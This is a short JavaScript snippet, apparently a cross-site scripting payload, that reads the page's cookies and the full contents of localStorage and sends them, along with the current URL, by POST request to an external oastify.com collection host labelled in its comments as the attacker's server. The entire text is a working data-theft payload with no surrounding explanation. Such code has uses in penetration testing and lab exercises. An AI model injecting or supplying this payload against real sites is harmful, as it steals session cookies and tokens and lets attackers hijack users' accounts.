var cookies = document.cookie;

// Steal localStorage tokens
var tokens = JSON.stringify(localStorage);

// Send to attacker's server
fetch('https://b1dwxjqy1aa18kejojhf4d4lnct3ht5i.oastify.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: cookies,
        localStorage: tokens,
        url: window.location.href
    })
});
